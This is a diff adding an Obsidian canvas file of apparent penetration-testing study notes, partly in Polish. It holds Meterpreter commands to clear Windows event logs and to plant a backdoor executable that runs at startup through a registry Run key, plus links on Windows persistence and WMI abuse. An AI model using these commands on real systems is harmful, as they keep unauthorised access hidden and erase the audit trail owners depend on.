@@ -1,0 +1,12 @@
+{
+	"nodes":[
+		{"id":"f7bf0c2e1aaa01f0","type":"link","url":"https://github.com/persistence-info/persistence-info.github.io?tab=readme-ov-file","x":5000,"y":-4495,"width":1058,"height":775},
+		{"id":"1b0428bb2a7ea9f6","type":"text","text":"# Clearing Your Tracks\n\n```bash\nmeterpreter>clearev\n```\n\nmoduły, np. post tworzą także pliki zawierające polecenia do wykonania aby wyczyścić ślady po działalności  \npokazują się w loot","x":6446,"y":-2510,"width":890,"height":320},
+		{"id":"d39ed670547fbf3a","type":"text","text":"# Backdor persistence\ncreate file and run it (every reboot, minute, 1hr,...)\n# $ msf > persistence\n```bash\nmsf> search persistence\nmsf> use local/persistence\nmeterpreter> run persistence -h\n```\n## check if module worked\nto check if changes are real\n```bash\nmeterpreter> reg queryval -k HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v <key_name>\n\nmeterpreter> ls C:\\\\Windows\\\\TEMP\\\\<file_name>\n```\n## manual persistence\n1. Upload the file into the victim machine:\n```bash\nmeterpreter> upload [path_to_backdoor_file] [path_on_target]\nmeterpreter> upload  /root/my_bd.exe  C:\\\\windows\\\n```\n2. Edit the Windows Registry Key with the reg command,\n```bash\nmeterpreter> reg setval –k [registry_key_path] –d [value_of_the key] –v [name_of_the_key]\nmeterpreter> reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -d \"C:\\Windows\\my_bd.exe\" -v bd_name\n```\n","x":6328,"y":-4495,"width":751,"height":905},
+		{"id":"4f6a61d411efc162","type":"text","text":"![[WMI with PowerShell#PowerLurk.ps1 (create malicious WMI events)]]","x":6240,"y":-3435,"width":928,"height":165},
+		{"id":"b303f530918c5313","x":5000,"y":-3670,"width":1058,"height":750,"type":"link","url":"https://hadess.io/the-art-of-windows-persistence/"}
+	],
+	"edges":[
+		{"id":"a49aedaeff304e23","fromNode":"d39ed670547fbf3a","fromSide":"bottom","toNode":"4f6a61d411efc162","toSide":"top"}
+	]
+}
